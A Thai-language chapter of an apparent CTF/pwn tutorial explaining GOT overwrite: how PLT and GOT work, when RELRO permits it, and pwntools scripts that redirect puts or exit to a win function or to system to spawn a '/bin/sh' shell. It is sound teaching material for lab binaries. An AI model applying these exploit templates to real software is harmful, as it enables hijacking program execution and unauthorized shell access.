# บท 10 — GOT Overwrite

เทคนิคที่เปลี่ยน "การเรียกฟังก์ชันปกติ" ให้กลายเป็น "กระโดดไปที่เรา
ต้องการ" โดยการเขียนทับตารางที่โปรแกรมใช้หา address ของฟังก์ชัน

## พื้นฐาน: PLT กับ GOT คืออะไร

เมื่อโปรแกรมเรียก `puts()` จาก libc มันไม่รู้ address ของ puts ตอน compile
(เพราะ ASLR สุ่มตำแหน่ง libc) จึงใช้กลไก 2 ตารางช่วย:

- **GOT** (Global Offset Table) — ตารางเก็บ **address จริง** ของฟังก์ชัน
  libc เติมค่าให้ตอน runtime
- **PLT** (Procedure Linkage Table) — ตัวกลางที่โปรแกรมเรียก แล้วมันไป
  อ่าน address จาก GOT อีกที

```
โปรแกรมเรียก puts
      ↓
puts@PLT  →  อ่าน address จาก  puts@GOT  →  กระโดดไป puts จริงใน libc
```

## ไอเดียการโจมตี

ถ้าเราเขียนทับค่าใน **GOT** ของฟังก์ชันหนึ่ง ให้ชี้ไปที่โค้ดของเรา
(เช่น win หรือ system) เมื่อโปรแกรมเรียกฟังก์ชันนั้นครั้งถัดไป มันจะ
กระโดดไปที่เราแทน

```
ก่อน overwrite:  puts@GOT → 0x7f...puts จริง
หลัง overwrite:  puts@GOT → address ของ win

เมื่อโปรแกรมเรียก puts() → กระโดดไป win() แทน!
```

## เงื่อนไข: RELRO ต้องไม่ใช่ Full

เช็คด้วย [checksec](05-tools.md#1-checksec--ด่านแรกเสมอ) ก่อน:

```
Partial RELRO  → GOT เขียนได้ ✓ ทำได้
No RELRO       → GOT เขียนได้ ✓ ทำได้
Full RELRO     → GOT อ่านอย่างเดียว ✗ ทำไม่ได้ (ต้องหาทางอื่น)
```

## วิธีเขียน GOT — มีหลายทาง

GOT overwrite เป็น "เป้าหมาย" ส่วน "วิธีเขียน" มาจากช่องโหว่ที่มี:

### ทาง 1: ผ่าน format string (พบบ่อยสุด)

ใช้ `fmtstr_payload` จากบทที่แล้ว:

```python
from pwn import *
context.binary = elf = ELF('./vuln')
p = process('./vuln')

offset = 6    # offset ของ input เรา (หาก่อน)

# เขียน GOT ของ puts ให้ชี้ไป win
payload = fmtstr_payload(offset, {elf.got['puts']: elf.symbols['win']})
p.sendlineafter(b'> ', payload)

# ครั้งต่อไปที่โปรแกรมเรียก puts() → ไป win()
p.interactive()
```

### ทาง 2: ผ่าน arbitrary write (เช่นจาก overflow ที่คุม pointer ได้)

ถ้าโจทย์ให้เราเขียนค่าลง address ที่เลือกได้ (write-what-where) ก็เขียน
GOT ตรงๆ:

```python
# สมมติมี primitive: write(address, value)
write(elf.got['exit'], elf.symbols['win'])
# พอโปรแกรมเรียก exit() → ไป win()
```

## เลือกเป้าหมายให้ดี — เขียน GOT ตัวไหน?

เขียน GOT ของฟังก์ชันที่**จะถูกเรียกหลังจากเราเขียนเสร็จ**:

```c
printf(user_input);      // ← เราเขียน GOT ตรงนี้ผ่าน format string
puts("done");            // ← เลือกเขียน puts@GOT เพราะมันถูกเรียกหลัง printf
exit(0);                 // ← หรือ exit@GOT ก็ได้ ถูกเรียกตอนจบ
```

> **กฎ:** เขียน GOT ของฟังก์ชันที่ยังไม่ถูกเรียก แต่กำลังจะถูกเรียก
> ถ้าเขียน GOT ของฟังก์ชันที่เรียกไปแล้ว = ไม่มีผล

## เคสคลาสสิก: เขียน GOT ให้ชี้ system

ถ้าโปรแกรมมีจุดที่เรียก `puts(user_controlled)` และเราเขียน
`puts@GOT → system` ได้ ครั้งถัดไปที่ `puts(ptr)` ถูกเรียก มันจะกลายเป็น
`system(ptr)` — ถ้า `ptr` ชี้ `"/bin/sh"` = ได้ shell

```python
# เขียน puts@GOT → system
payload = fmtstr_payload(offset, {elf.got['puts']: libc.symbols['system']})
p.sendline(payload)

# แล้วส่ง "/bin/sh" เข้าไปให้ puts (ที่ตอนนี้เป็น system) เรียก
p.sendline(b'/bin/sh')
p.interactive()
```

## ตรวจสอบด้วย GDB

```bash
pwndbg> got                        # ดู GOT ทั้งหมด + ค่าปัจจุบัน
pwndbg> x/gx 0x404018              # ดูค่าใน GOT entry เจาะจง
# หลังส่ง payload ดูว่าค่าเปลี่ยนเป็น address ที่เราต้องการไหม
```

---

## สรุปบทนี้

- **GOT** เก็บ address จริงของฟังก์ชัน libc; **PLT** เป็นตัวกลางเรียก
- เขียนทับ GOT ให้ชี้ที่เรา → ครั้งถัดไปที่ฟังก์ชันถูกเรียก = กระโดดไปที่เรา
- ต้อง **ไม่ใช่ Full RELRO**
- วิธีเขียนมาจากช่องโหว่: format string (`fmtstr_payload`) หรือ arbitrary write
- เลือกเขียน GOT ของฟังก์ชันที่**กำลังจะถูกเรียก**

โจทย์ฝึก: picoCTF format-string ที่ทำ GOT overwrite, ROP Emporium
**badchars** (write primitive)

บทต่อไป: รวบ workflow ทั้งหมดเป็นขั้นตอนใช้ซ้ำได้ →
